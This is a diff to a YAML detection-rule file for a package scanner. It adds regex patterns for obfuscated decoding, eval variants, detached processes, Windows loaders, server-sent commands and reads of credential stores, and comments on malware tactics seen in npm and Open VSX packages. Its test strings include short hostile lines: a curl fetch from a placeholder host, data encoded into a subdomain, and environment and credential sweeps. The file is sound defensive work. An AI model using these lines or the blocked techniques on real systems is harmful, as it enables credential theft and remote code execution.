@@ -36,17 +36,143 @@ rules:
       kind: regex
       patterns:
         - '\batob\s*\('
-        - 'Buffer\s*\.\s*from\s*\([^)]{0,200}?["'']base64["'']'
+        # Hex as well as base64: an install script that reads a hex string from a file it ships and
+        # runs it decoded is the `kp-admin` / `ks-radar` preinstall family (review 98, npm bulk
+        # set), and nothing here read hex as a decode.
+        # Not when only the size is taken: `Buffer.from(v, "base64").length` checks a value's
+        # length and runs nothing (review 98 after4 A/B: a terminal server's input check).
+        - 'Buffer\s*\.\s*from\s*\([^)]{0,200}?["''](?:base64|base64url|hex)["''](?!\s{0,4}\)\s{0,4}\.\s{0,4}(?:length|byteLength)\b)'
         - 'decodeURIComponent\s*\(\s*escape\s*\('
         - 'from\s*\(\s*["'']hex["'']\s*\)'
+        # A hand-written hex decoder: two characters at a time through parseInt(..., 16). How a
+        # payload fetched as an innocent-looking "version_hash" becomes a command line.
+        - 'String\s{0,4}\.\s{0,4}fromCharCode\s{0,4}\(\s{0,4}parseInt\s{0,4}\([^\n]{0,80}?,\s{0,4}16\s{0,4}\)\s{0,4}\)'
+        # The same decoder spread over the pairs: `String.fromCharCode(...s.match(/../g).map(h =>
+        # parseInt(h, 16)))`.
+        - 'String\s{0,4}\.\s{0,4}fromCharCode\s{0,4}\(\s{0,4}\.\.\.[^\n]{0,200}?parseInt\s{0,4}\([^\n]{0,40}?,\s{0,4}16\s{0,4}\)'
+        # SYMMETRIC DECRYPTION, a decode with a key (as in the Python primitive). An install
+        # script that decrypts a file shipped beside it, runs the plaintext and deletes it hides
+        # the program from anyone reading the package -- the key is in the script, the program
+        # is not (npm, review 98, work half).
+        - '\bcreateDecipher(?:iv)?\s{0,4}\('
     tests:
       positive:
         - "const raw = atob(payload);"
+        - "var dc = cr.createDecipheriv(alg, k, iv);"
         - "const buf = Buffer.from(data, 'base64');"
+        - "const cmd = Buffer.from(hexCommand, 'hex').toString();"
+        - "String.fromCharCode(...s.match(/../g).map(h => parseInt(h, 16)));"
         - "const s = decodeURIComponent(escape(x));"
+        - "for (let n = 0; n < e.length; n += 2) t += String.fromCharCode(parseInt(e.slice(n, n + 2), 16));"
       negative:
         - "const s = decodeURIComponent(location.search);"
         - "const buf = Buffer.from('plain text');"
+        - 'return Buffer.from(value, "base64").length;'
+        - "const digest = hash.digest('hex');"
+        - "const s = buf.toString('hex');"
+
+  - id: CAP.JS.CHARCODE_STRING.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: medium
+    capability: decode
+    title: Spells a string as character codes
+    message: >
+      This file writes a string as a list of character codes and turns it back into text at
+      runtime, so the text -- a URL, a module name, a command -- appears nowhere a reader or a
+      search would find it.
+    remediation: Decode the list and check what the string is used for.
+    provenance:
+      kind: research
+      reference: >
+        An install script building its collection URL from `[104,116,116,112,115,...]` mapped
+        through String.fromCharCode, then posting the host's details to it (review 98).
+    languages: [javascript, typescript]
+    match:
+      kind: regex
+      patterns:
+        - '\[\s{0,4}(?:\d{2,3}\s{0,4},\s{0,4}){8,}\d{2,3}\s{0,4}\][^\n]{0,300}?fromCharCode'
+        # Or short strings spelled that way, each handed to a local decoder:
+        # `d([108,111,111,107,117,112])` for `lookup` (review 98, dax-styles). Four codes or more,
+        # each below 200 as text's are: a bundle's `f([12, 34])` and `rgb([255,255,255])` are
+        # numbers, not names (about twenty Open VSX extensions' dist/ bundles matched the looser
+        # form).
+        - 'fromCharCode[\s\S]{0,2000}?(?<![\w$.])(?<!new )(?!(?:U?[Ii]nt(?:8|16|32)(?:Clamped)?Array|Array|Buffer|Set)\b)[A-Za-z_$][\w$]{0,20}\(\s{0,4}\[\s{0,4}1?\d\d(?:\s{0,4},\s{0,4}1?\d\d){3,40}\s{0,4}\]\s{0,4}\)'
+        - 'String\s{0,4}\.\s{0,4}fromCharCode\s{0,4}\(\s{0,4}(?:\.\.\.\s{0,4})?\[?\s{0,4}(?:\d{2,3}\s{0,4},\s{0,4}){8,}\d{2,3}'
+    tests:
+      positive:
+        - "const codes=[104,116,116,112,115,58,47,47,101,120];const u=codes.map(c=>String.fromCharCode(c)).join('')"
+        - "const s = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 120, 121);"
+        - "const d=a=>a.map(c=>String.fromCharCode(c)).join('');const x=d([108,111,111,107,117,112]);"
+      negative:
+        - "const nl = String.fromCharCode(10);"
+        - "const ch = String.fromCharCode(code);"
+        - "String.fromCharCode(c);var m=f([12, 34]),k=rgb([255,255,255,0]);"
+        - "String.fromCharCode(c);var L=new Uint8Array([116,114,97,105,108,101,114]);"
+
+  - id: CAP.JS.FUNCTION_AS_VALUE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: medium
+    capability: dynamic_dispatch
+    title: Keeps the Function constructor as a value
+    message: >
+      This file stores the Function constructor -- JavaScript's eval for whole function bodies --
+      in an array or a variable, so the code it later builds and runs is called through a name
+      that never says Function.
+    remediation: Find the strings it compiles and where they come from.
+    provenance:
+      kind: research
+      reference: >
+        A preinstall keeping `[Function, require]` in an array and compiling a request built
+        from string fragments that sends the user and working directory (review 98).
+    languages: [javascript, typescript]
+    match:
+      kind: regex
+      patterns:
+        # Kept beside the loader or eval, as data: `[Function, require]`. Not an alias on its own --
+        # `var $Function = Function` is get-intrinsic and `const F = Function; new F("")` is a CSP
+        # probe, in thousands of bundles (review 98).
+        - '\[\s{0,4}Function\s{0,4},\s{0,4}(?:require|eval)\b|\[\s{0,4}(?:require|eval)\s{0,4},\s{0,4}Function\b'
+    tests:
+      positive:
+        - "const func_list = [Function, require];"
+      negative:
+        - "if (x instanceof Function) {}"
+        - "props: { cb: { type: [String, Function] } }"
+        - "var $Function = Function;"
+        - "const F = Function; new F('');"
+
+  - id: CAP.JS.DATA_IN_HOSTNAME.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: medium
+    capability: egress
+    title: Puts data in the host name it contacts
+    message: >
+      This file builds a URL whose host name begins with a value it computed -- a label made of
+      data in front of a fixed domain. Whoever runs that domain's name server receives the data
+      in the lookup itself, before any request is sent.
+    remediation: Find what the label carries.
+    provenance:
+      kind: research
+      reference: >
+        A preinstall hex-encoding the host name, home directory and local addresses into the
+        subdomain of a "download speed test" (review 98).
+    languages: [javascript, typescript]
+    match:
+      kind: regex
+      patterns:
+        - '["''`]https?://["''`]\s{0,4}\+\s{0,4}[A-Za-z_$][\w$.]{0,40}\s{0,4}\+\s{0,4}["''`]\.[a-z0-9-]{1,63}\.'
+        - '`https?://\$\{\s{0,4}[A-Za-z_$][\w$.]{0,40}\s{0,4}\}\.[a-z0-9-]{1,63}\.[a-z0-9.-]{2,}'
+    tests:
+      positive:
+        - "const baseUrl = 'https://'+data+'.rockwell.example.online';"
+      negative:
+        - "const u = 'https://' + host + '/path';"
 
   # ---------------------------------------------------------------------
   # EXECUTE
@@ -71,7 +197,11 @@ rules:
     match:
       kind: regex
       patterns:
-        - '\beval\s*\('
+        # Not `eval('import(\'pkg\')')`: a literal that is exactly a dynamic import of a package
+        # name, the bundler idiom that hides `import()` from a CommonJS build (note 70 D2: three
+        # Baileys forks). Any other literal is read as code here -- one that fetches and evals
+        # still matches.
+        - '\beval\s*\((?!\s*(?:''import\(\s*\\?["''][\w@./-]{1,200}\\?["'']\s*\)''|"import\(\s*\\?["''][\w@./-]{1,200}\\?["'']\s*\)")\s*\))'
         # `.constructor` between the name and the parenthesis, because
         # `Function.constructor` IS `Function` -- every function's constructor
         # is the `Function` constructor -- so `new Function.constructor(a, b)`
@@ -95,16 +225,151 @@ rules:
         # Require hooks (ts-node, pirates) call it too, which is why this is a capability and
         # not a finding.
         - '\._compile\s*\(\s*[A-Za-z_$][\w$]{0,40}\s*,'
+        # The same loader reached through the prototype: `Module.prototype._compile.call(m, s, f)`.
+        - '\bprototype\s{0,4}\.\s{0,4}_compile\s{0,4}\.\s{0,4}(?:call|apply)\s{0,4}\('
+        # The rest of the ways JavaScript runs a string (review 98, spelling matrix): `Function`
+        # called without `new` (it is the same constructor), indirect eval `(0, eval)(s)`, eval
+        # and Function looked up on the global object by name, and a `vm.Script` compiled by hand.
+        # Not `Function("return this")()`: the global-object polyfill every bundler emits, which
+        # runs one fixed statement (a skill package's bundle blocked on it, review 98 after4 A/B);
+        # nor `Function("binder", "return function (" + ...)`, the `function-bind` shim bundled
+        # into extensions, which builds a wrapper of fixed text around its arguments' arity.
+        - '(?<![\w$.])Function\s{0,4}\(\s{0,4}(?!["''`]\s{0,4}return\s{1,4}this\s{0,4}["''`]\s{0,4}\)|["''`]binder["''`]\s{0,4},)[\w$"''`]'
+        - '\(\s{0,4}0\s{0,4},\s{0,4}eval\s{0,4}\)\s{0,4}\('
+        - '\b(?:globalThis|global|window|self)\s{0,4}\[\s{0,4}["''`](?:eval|Function)["''`]\s{0,4}\]\s{0,4}\('
+        - '\bnew\s{1,4}\(?\s{0,4}(?:vm|require\s{0,4}\(\s{0,4}["''](?:node:)?vm["'']\s{0,4}\))\s{0,4}\.\s{0,4}Script\s{0,4}\)?\s{0,4}\('
     tests:
       positive:
         - "eval(decoded);"
+        - "eval('fetch(u).then(r => r.text()).then(eval)');"
+        - "eval('import(' + name + ')');"
+        - "Function(src)();"
+        - "(0, eval)(src);"
+        - "globalThis['eval'](src);"
+        - "new vm.Script(src).runInThisContext();"
+        - "new (require('vm').Script)(src).runInThisContext();"
+        - "require('module').prototype._compile.call(m, src, f);"
         - "m._compile(code, 'db-session.js');"
         - "const fn = new Function('a', 'return a');"
         - "const handler = new Function.constructor('require', response);"
         - "vm.runInNewContext(src, sandbox);"
       negative:
         - "// eval is not used here"
+        - "const m = await eval('import(\\'audio-decode\\')');"
         - "const evaluate = (x) => x * 2;"
+        - "if (typeof cb === 'function') isFunction(cb);"
+        - "var g = Function('return this')();"
+        - "var root = Function(\"return this\")();"
+        - 'b = Function("binder", "return function (" + a.join(",") + "){ return binder.apply(this,arguments); }")(f);'
+        - "const t: Function = () => {};"
+
+  # ---------------------------------------------------------------------
+  # A PROCESS LEFT RUNNING AFTER ITS PARENT EXITS
+  # ---------------------------------------------------------------------
+  - id: CAP.JS.DETACHED.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: spawn
+    title: Starts a process that outlives the one that started it
+    message: >
+      A child process is started detached, or released with unref(), so it keeps running after
+      this program ends. A command-line tool may do that for a background job; an install script
+      that does it leaves code running on the machine after npm has finished.
+    remediation: Find what the child runs and why it must outlive the install.
+    provenance:
+      kind: research
+      reference: >
+        Install scripts that start a second file in the background and exit, so the payload runs
+        after the install reports success (review 98: adfg-project, apache-httpclient, kodane).
+    languages: [javascript, typescript]
+    match:
+      kind: regex
+      patterns:
+        # The process call itself handed `detached`. A timer's or a socket's `.unref()` is not
+        # this: matching it alone blocked 21 benign bundles (review 98).
+        - '\b(?:spawn|fork|exec|execFile)\s{0,4}\([^;]{0,400}?\bdetached\s{0,4}:\s{0,4}(?:true|!0)\b'
+        # Or handed an options object built first: `const opts = { detached: true, ... };` then
+        # `spawn(process.execPath, [daemon], opts)` -- kodane's daemon installer (review 98).
+        - '(?:const|let|var)\s{1,4}[A-Za-z_$][\w$]{0,40}\s{0,4}=\s{0,4}\{[^{}]{0,400}?\bdetached\s{0,4}:\s{0,4}(?:true|!0)\b[\s\S]{0,1200}?\b(?:spawn|fork|execFile)\s{0,4}\([^;()]{0,300}?,\s{0,4}[A-Za-z_$][\w$]{0,40}\s{0,4}\)'
+    tests:
+      positive:
+        - "spawn('node', [f], { detached: true, stdio: 'ignore' });"
+        - "const spawnOptions = {\n  detached: true,\n  stdio: 'ignore',\n};\nconst d = spawn(process.execPath, [p], spawnOptions);"
+        - "const c = spawn(process.execPath, [w], {\n  detached: true,\n});"
+      negative:
+        - "spawn('node', [f], { stdio: 'inherit' });"
+        - "const detached = false;"
+        - "setTimeout(tick, 1000).unref();"
+        - "server.unref();"
+
+  # ---------------------------------------------------------------------
+  # CODE SHIPPED IN A FORM NO READER CAN INSPECT
+  # ---------------------------------------------------------------------
+  - id: CAP.JS.OPAQUE_CODE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: execute
+    title: Runs compiled JavaScript bytecode
+    message: >
+      This file runs V8 bytecode -- a .jsc file through bytenode, or a vm.Script given cached
+      data -- so the code that runs is not in the package in any form a person or a scanner can
+      read.
+    remediation: Do not install a package whose install-time code ships only as bytecode.
+    provenance:
+      kind: research
+      reference: An install hook that loads ./main.jsc through bytenode (review 98, alinet).
+    languages: [javascript, typescript]
+    match:
+      kind: regex
+      patterns:
+        - 'require\s{0,4}\(\s{0,4}["'']bytenode["'']\s{0,4}\)'
+        - 'require\s{0,4}\(\s{0,4}["''][^"''\n]{1,200}\.jsc["'']\s{0,4}\)'
+        - '\bnew\s{1,4}vm\s{0,4}\.\s{0,4}Script\s{0,4}\([^)]{0,300}\bcachedData\b'
+    tests:
+      positive:
+        - "require('bytenode');\nrequire('./main.jsc');"
+      negative:
+        - "require('./main.js');"
+
+  # ---------------------------------------------------------------------
+  # A WINDOWS LOADER STARTED FROM JAVASCRIPT
+  # ---------------------------------------------------------------------
+  - id: CAP.JS.WINDOWS_LOADER.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: execute
+    title: Starts a Windows loader that runs a DLL or a script
+    message: >
+      This file hands rundll32, regsvr32, mshta, wscript or cscript to a process call. Each runs
+      code from a file or a URL it is given -- a DLL's entry point, a scriptlet, an HTA -- which is
+      how a package ships a native payload without a build step.
+    remediation: >
+      Find what file it is given and where that file came from. A library has no reason to start
+      one of these.
+    provenance:
+      kind: research
+      reference: >
+        The compromised eslint-config-prettier releases (July 2025) ran a bundled node-gyp.dll from
+        postinstall through rundll32, with every name split into string fragments (review 98).
+    languages: [javascript, typescript]
+    match:
+      kind: regex
+      patterns:
+        - '(?i:(?:spawn|spawnSync|exec|execSync|execFile|execFileSync|fork)\s{0,4}["''\]]{0,2}\s{0,4}\(\s{0,4}["''](?:[\w:\\/.-]{0,80}[\\/])?(?:rundll32|regsvr32|mshta|wscript|cscript)(?:\.exe)?(?:["'']|\s))'
+    tests:
+      positive:
+        - 'cp.spawn("rundll32", [dll + ",main"]);'
+        - 'require("child_process")["spawn"]("rundll32", [p]);'
+        - "execSync('regsvr32 /s x.dll');"
+      negative:
+        - 'spawn("node", ["build.js"]);'
+        - "// rundll32 is how Windows runs a DLL entry point"
 
   # ---------------------------------------------------------------------
   # SPAWN
@@ -132,7 +397,7 @@ rules:
         # `SUSPECT.DECODE_EXEC.001` finding on `import { execFile } from
         # 'node:child_process'`, the first line of the file, 200 lines from anything
         # it was paired with.
-        - 'require\s*\(\s*["''](?:node:)?child_process["'']\s*\)\s*\.\s*\w{1,20}\s*\('
+        - 'require\s*\(\s*["''](?:node:)?child_process["'']\s*\)\s*(?:\.\s*\w{1,20}|\[\s*["'']\w{1,20}["'']\s*\])\s*\('
         # The unambiguous names, which mean one thing in JavaScript.
         - '\b(?:execSync|spawnSync|execFileSync|execFile|fork)\s{0,4}\('
         # `exec` and `spawn` are NOT unambiguous, and the bare spelling was the
@@ -153,9 +418,25 @@ rules:
         # the capability is still found when the call is written `childProc.exec(...)`.
         - '(?<![.\w$])(?:exec|spawn)\s{0,4}\('
         - '\b(?:child_process|childProcess|child|cp|cproc|proc|subprocess|shell)\s{0,4}\.\s{0,4}(?:exec|spawn)\s{0,4}\('
+        # The module imported under any name, then a method that starts a process.
+        - 'import\s{1,4}(?:[\w$]{1,40}|\*\s{0,4}as\s{1,4}[\w$]{1,40})\s{0,4}from\s{0,4}["''](?:node:)?child_process["''][\s\S]{0,4000}?\.\s{0,4}(?:exec|spawn|execFile|fork)(?:Sync)?\s{0,4}\('
+        # A call destructured under another name: `const { execSync: run } = require(
+        # 'child_process')`. Renaming the call is the one reason to write it so; the declaration is
+        # matched because the call site, `run(c)`, says nothing (review 98, spelling matrix). The
+        # rule loader allows no backreference, so the call is not tied to the name.
+        - '\{[^}]{0,200}\b(?:exec|spawn|execFile|fork)(?:Sync)?\s{0,4}:\s{0,4}[A-Za-z_$][\w$]{0,40}[^}]{0,200}\}\s{0,4}(?:=\s{0,4}(?:require\s{0,4}\(|(?:await\s{1,4})?import\s{0,4}\()|from)\s{0,4}["''](?:node:)?child_process["'']'
+        # The module named in a constant, to be required by it: `const m = 'child_process'`.
+        - '\b(?:const|let|var)\s{1,4}[A-Za-z_$][\w$]{0,40}\s{0,4}=\s{0,4}["''](?:node:)?child_process["'']\s{0,4}[;,\n]'
+        # Node's internal binding, beneath the module: `process.binding('spawn_sync').spawn(o)`.
+        - '\bprocess\s{0,4}\.\s{0,4}(?:binding|_linkedBinding)\s{0,4}\(\s{0,4}["''](?:spawn_sync|process_wrap)["'']'
     tests:
       positive:
         - "require('child_process').exec(cmd);"
+        - "const { execSync: run } = require('child_process');\nrun(cmd);"
+        - "const m = 'child_process';\nrequire(m).exec(cmd);"
+        - "process.binding('spawn_sync').spawn(opts);"
+        - "require('child_process')[\"spawn\"](\"x\", [p]);"
+        - "import * as runner from 'node:child_process';\nrunner.execSync(cmd);"
         - "execSync('npm run build');"
         - "exec('rm -rf /tmp/x');"
         - "child_process.exec(cmd);"
@@ -195,7 +476,13 @@ rules:
         # `process.env` anywhere in the argument list, not only as the sole
         # argument. `Object.assign({}, process.env, extra)` is the ordinary way
         # to copy the environment and the anchored form missed all of it.
-        - 'Object\s*\.\s*(?:keys|values|entries|assign)\s*\([^)]{0,120}process\s*\.\s*env\b'
+        # Not a selection by prefix: the `debug` package's `Object.keys(process.env).filter(k =>
+        # /^debug_/i.test(k))` and LangChain's `Object.entries(process.env)` read with
+        # `k.startsWith("LANGCHAIN_")` take their own settings, bundled into thousands of
+        # extensions (8 of 300 Open VSX extensions reported MALWARE.EXFIL.001 on it, review 98).
+        # Copying every key (`forEach(k => out[k] = process.env[k])`) is still the whole
+        # environment: malware collects it that way before it sends it.
+        - 'Object\s*\.\s*(?:keys|values|entries|assign)\s*\([^)]{0,120}process\s*\.\s*env\b(?!\s*\)\s*\.\s*filter\s*\()(?![^\n]{0,80}?\.\s*startsWith\s*\()'
         # The SPREAD is deliberately absent, and it used to be here.
         #
         # `{ ...process.env, FOO: undefined }` is how every Node program builds an
@@ -224,20 +511,37 @@ rules:
         - '\.npmrc\b'
         - '\.ssh/|id_rsa|id_ed25519'
         - '\.aws/credentials|\.config/gcloud|\.kube/config'
+        # The same stores as Node usually names them, one segment per argument:
+        # `path.join(os.homedir(), '.docker', 'config.json')` never writes `.docker/config.json`
+        # (review 98, spelling matrix). Registry and cluster tokens, the GitHub CLI's token file,
+        # the cloud CLIs' credentials and the desktop wallets.
+        - '["''`]\.(?:docker["''`]\s{0,4},\s{0,4}["''`]config\.json|kube["''`]\s{0,4},\s{0,4}["''`]config|aws["''`]\s{0,4},\s{0,4}["''`](?:credentials|config)|azure["''`]\s{0,4},\s{0,4}["''`]accessTokens\.json)["''`]'
+        - '["''`]gh["''`]\s{0,4},\s{0,4}["''`]hosts\.yml["''`]|\bgh/hosts\.yml\b|\.git-credentials\b'
+        - '["''`]\.config["''`]\s{0,4},\s{0,4}["''`]gcloud["''`]'
+        - '["''`]Exodus["''`]\s{0,4},\s{0,4}["''`]exodus\.wallet["''`]|\bExodus/exodus\.wallet\b|\bwallet\.dat\b|\bkeystore/UTC--'
         - '\bprocess\s*\.\s*env\s*\.\s*(?:NPM_TOKEN|GITHUB_TOKEN|AWS_SECRET_ACCESS_KEY)'
     tests:
       positive:
         - "const all = JSON.stringify(process.env);"
+        - "fs.readFileSync(path.join(os.homedir(), '.docker', 'config.json'));"
+        - "fs.readFileSync(path.join(home, '.kube', 'config'));"
+        - "fs.readFileSync(path.join(home, '.config', 'gh', 'hosts.yml'));"
+        - "fs.readdirSync(path.join(appdata, 'Exodus', 'exodus.wallet'));"
         - "const keys = Object.keys(process.env);"
         - "fs.readFileSync(os.homedir() + '/.npmrc');"
         - "for (var k in process.env) { dump[k] = process.env[k]; }"
+        - "Object.keys(process.env).forEach(k => out[k] = process.env[k]);"
         - "for (const [k, v] of Object.entries(process.env)) send(k, v);"
         - "fs.readFileSync('/proc/1/environ', 'utf8');"
         - "fs.readFileSync(`/proc/${pid}/environ`, 'utf8');"
       negative:
         - "const env = { ...process.env, npm_config_global: void 0 };"
+        - "const dockerfile = path.join(root, '.docker', 'Dockerfile');"
+        - "const cfg = path.join(root, '.config', 'myapp.json');"
         - "const port = process.env.PORT || 3000;"
         - "if (process.env.NODE_ENV === 'production') {}"
+        - "inspectOpts=Object.keys(process.env).filter(r=>/^debug_/i.test(r))"
+        - "for(let[e,t]of Object.entries(process.env))(e.startsWith(\"LANGCHAIN_\"))&&(o[e]=t)"
 
   # ---------------------------------------------------------------------
   # EGRESS
@@ -290,6 +594,36 @@ rules:
         - "console.log('next: npm publish')"
         - "throw new Error('you must npm publish first')"
 
+  - id: CAP.JS.REMOTE_COMMAND.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: fetch_exec
+    title: Runs a command a server sent
+    message: >
+      This file parses a server's response, decodes a field of it, and hands the result to a
+      shell. Whoever controls that server runs commands on this machine whenever they choose:
+      a remote shell written as a version check.
+    remediation: >
+      Do not run it. Treat the machine as reachable by whoever answers that request.
+    languages: [javascript, typescript]
+    match:
+      kind: regex
+      patterns:
+        # Measured (review 98): three Open VSX extensions whose "version check" hex-decodes
+        # `version_hash` from `solidity.bot` and runs it -- `(0,h.exec)(n)` in webpack's
+        # output -- and nothing among 3,000 benign Open VSX extensions. A RegExp's `.exec()` is
+        # not a shell, so a method call counts only in webpack's `(0,x.exec)(` form.
+        - 'JSON\.parse\([^()]{0,40}\)[\s\S]{0,600}?(?:fromCharCode|Buffer\.from\([^()]{0,80}(?:hex|base64)|atob\(|decode\w*\()[\s\S]{0,200}?(?:\(0\s*,\s*[\w$]+\.(?:exec|execSync|spawn|spawnSync|execFile)\)|(?<![.\w$])(?:exec|execSync|spawn))\s*\(\s*[\w$.]{1,40}\s*\)'
+    tests:
+      positive:
+        - 'const e=JSON.parse(t);if(e.version!==v){const n=this.decode_hash(e.version_hash);(0,h.exec)(n)}'
+        - 'const r = JSON.parse(body); const cmd = Buffer.from(r.task, "base64").toString(); exec(cmd)'
+      negative:
+        - 'let n=JSON.parse(t);a+=o.decode(d,{stream:!0});let l=F.exec(a)'
+        - 'const r = JSON.parse(body); const s = Buffer.from(r.blob, "base64"); fs.writeFileSync(f, s)'
+
   - id: CAP.JS.RECON.001
     version: 1.0.0
     category: policy
@@ -311,6 +645,22 @@ rules:
       patterns:
         - '\bos\s*\.\s*(?:hostname|userInfo|homedir|networkInterfaces)\s*\('
         - '\bprocess\s*\.\s*env\s*(?:\.\s*|\[\s*["''])(?:USERNAME|COMPUTERNAME|USERPROFILE|USERDOMAIN|HOSTNAME|LOGNAME)\b'
+        # The module under another name: `const o = require('os')` and then `o.hostname()`, or
+        # the calls destructured out of it. One letter was enough to hide the recon half of an
+        # install-time beacon posting hostname, user and home directory (review 98:
+        # @navancorp/*). Anchored on the `os` module itself, so another library's `hostname()`
+        # method is not this.
+        - 'require\s{0,4}\(\s{0,4}["''](?:node:)?os["'']\s{0,4}\)[\s\S]{0,4000}?\.\s{0,4}(?:hostname|userInfo|networkInterfaces)\s{0,4}\(\s{0,4}\)'
+        - '\{[^}\n]{0,120}\b(?:hostname|userInfo|networkInterfaces)\b[^}\n]{0,120}\}\s{0,4}=\s{0,4}require\s{0,4}\(\s{0,4}["''](?:node:)?os["'']\s{0,4}\)'
+        # The call named as data and looked up: `[["userInfo", "username"], ["hostname"]]` walked
+        # with `reduce` over the `os` module, so no `.hostname(` is written (review 98: report.js).
+        - 'require\s{0,4}\(\s{0,4}["''](?:node:)?os["'']\s{0,4}\)[\s\S]{0,4000}?["''](?:userInfo|hostname|networkInterfaces)["'']'
+        # The same as ES imports: `import os from 'os'` under any name, then `.hostname()`; or the
+        # calls imported by name.
+        - 'import\s{1,4}(?:[\w$]{1,40}|\*\s{0,4}as\s{1,4}[\w$]{1,40})\s{0,4}from\s{0,4}["''](?:node:)?os["''][\s\S]{0,4000}?\.\s{0,4}(?:hostname|userInfo|networkInterfaces)\s{0,4}\(\s{0,4}\)'
+        # Imported by name, only once called: a module that imports `hostname` to type a value
+        # or pass it on reads nothing (review 98 after4 A/B).
+        - 'import\s{0,4}\{[^}]{0,120}\b(?:hostname|userInfo|networkInterfaces)\b[^}]{0,120}\}\s{0,4}from\s{0,4}["''](?:node:)?os["''][\s\S]{0,4000}?(?<![\w$.])(?:hostname|userInfo|networkInterfaces)\s{0,4}\('
         # `os.platform()`, `os.arch()` and `process.cwd()` are deliberately absent.
         # Every bundler, test runner and postinstall build step in the ecosystem
         # calls them, and they say what kind of machine this is rather than which
@@ -320,9 +670,16 @@ rules:
         - "const h = os.hostname();"
         - "const who = os.userInfo().username;"
         - "const name = process.env.COMPUTERNAME;"
+        - "const o = require('os');\nconst d = { h: o.hostname(), u: o.userInfo().username };"
+        - "const { hostname, userInfo } = require('os');"
+        - "import sys from 'node:os';\nconst who = sys.userInfo().username;"
+        - "import { hostname, homedir } from 'os';\nconst h = hostname();"
       negative:
         - "const p = os.platform();"
+        - "const o = require('os');\nconst a = o.arch();"
+        - "const u = new URL(x);\nconst h = u.hostname;"
         - "const cwd = process.cwd();"
+        - "import { hostname } from 'node:os';\nexport const label = { hostname };"
         - "const node = process.env.NODE_ENV;"
 
   - id: CAP.JS.EGRESS.001
@@ -350,6 +707,15 @@ rules:
         - '\bnew\s+XMLHttpRequest\s*\('
         - '\bnavigator\s*\.\s*sendBeacon\s*\('
         - '\brequire\s*\(\s*["''](?:node:)?https?["'']\s*\)'
+        # The same module as an ES import: `import https from 'https'`, `import * as http from
+        # 'node:http'`, `import { request } from 'https'`, or `await import('https')`. An
+        # install-time credential sweep that imported https this way had no network half to
+        # pair with (review 98, npm bulk set: stitch-design). Only with a request made: a file
+        # that imports http to call `createServer` listens and sends nothing (review 98 after4
+        # A/B: two CLIs serving a local page).
+        - 'import\s{1,4}(?:[\w$]{1,40}|\*\s{0,4}as\s{1,4}[\w$]{1,40})\s{0,4}from\s{0,4}["''](?:node:)?https?["''][\s\S]{0,4000}?\.\s{0,4}(?:request|get)\s{0,4}\('
+        - 'import\s{0,4}\{[^}]{0,200}\b(?:request|get|Agent)\b[^}]{0,200}\}\s{0,4}from\s{0,4}["''](?:node:)?https?["'']'
+        - '\bimport\s{0,4}\(\s{0,4}["''](?:node:)?https?["'']\s{0,4}\)'
         # The same module through another name for `require`: `const _req = module.require;
         # _req('http')`, which `ts-browser-webpack` uses so no `require('http')` appears. A bare
         # call -- not a method, so `url.startsWith('http')` is not one.
@@ -358,15 +724,49 @@ rules:
         # call that follows is named (`request({url, json})`, `got.post`, `needle('post', ...)`).
         - '(?:require\s{0,4}\(|from)\s{0,4}["''](?:request|got|needle|superagent|node-fetch|undici|phin|bent|cross-fetch|isomorphic-fetch|axios)["'']'
         - '\bnet\s*\.\s*(?:connect|createConnection)\s*\('
+        - '\bnew\s{1,4}(?:net\s{0,4}\.\s{0,4})?Socket\s{0,4}\('
+        # The raw-socket modules every other way they are written (review 98, spelling matrix):
+        # required inline, `tls` and UDP `dgram` alongside `net`, and their calls imported by name.
+        - '\bnew\s{0,4}\(\s{0,4}require\s{0,4}\(\s{0,4}["''](?:node:)?net["'']\s{0,4}\)\s{0,4}\.\s{0,4}Socket\s{0,4}\)'
+        - '\brequire\s{0,4}\(\s{0,4}["''](?:node:)?(?:net|tls|dgram)["'']\s{0,4}\)\s{0,4}\.\s{0,4}(?:connect|createConnection|createSocket)\s{0,4}\('
+        - '\b(?:tls|dgram)\s{0,4}\.\s{0,4}(?:connect|createSocket)\s{0,4}\('
+        # Imported by name, only once a socket is made: `Socket` imported as a type is not one
+        # (review 98 after4 A/B).
+        - '\{[^}]{0,200}\b(?:connect|createConnection|createSocket|Socket)\b[^}]{0,200}\}\s{0,4}(?:=\s{0,4}require\s{0,4}\(|from)\s{0,4}["''](?:node:)?(?:net|tls|dgram)["''][\s\S]{0,4000}?(?:(?<![\w$.])(?:connect|createConnection|createSocket)\s{0,4}\(|\bnew\s{1,4}Socket\s{0,4}\()'
+        # The `dns` calls destructured or imported by name: `const { lookup } = require('dns')`.
+        - '\{[^}]{0,200}\b(?:lookup|resolve\w{0,8})\b[^}]{0,200}\}\s{0,4}(?:=\s{0,4}require\s{0,4}\(|from)\s{0,4}["''](?:node:)?dns(?:/promises)?["'']'
+        # A name resolved is a packet sent: `dns.lookup(<data>.collector.example)` carries
+        # whatever it was built from in the name itself, and a lookup of a fixed name tells its
+        # owner the code ran. Install-time beacons do both (review 98: test_send.js, pre-install.js).
+        - '\bdns\s{0,4}\.\s{0,4}(?:promises\s{0,4}\.\s{0,4})?(?:lookup|resolve\w{0,8})\s{0,4}\('
+        # The same with the module required inline: `require('dns').resolve(<label>.collector)`
+        # (review 98, npm bulk set: a preinstall dependency-confusion probe).
+        - 'require\s{0,4}\(\s{0,4}["''](?:node:)?dns["'']\s{0,4}\)\s{0,4}\.\s{0,4}(?:promises\s{0,4}\.\s{0,4})?(?:lookup|resolve\w{0,8})\s{0,4}\('
+        # A download written as a command line in a string the code runs.
+        - '["''`]\s{0,8}(?:curl|wget)(?:\.exe)?\s[^\n]{0,200}?https?://'
     tests:
       positive:
         - "await fetch(endpoint, { method: 'POST' });"
+        - "run('curl -fsSL https://example.invalid/i.sh')"
         - "navigator.sendBeacon(url, payload);"
         - "const http = require('https');"
         - "const http = require('node:http');"
         - "const _req = module.require; const http = _req('http');"
+        - "import https from 'https';\nhttps.request(opts, cb);"
+        - "import * as http from 'node:http';\nhttp.get(url);"
+        - "import { request } from 'https';"
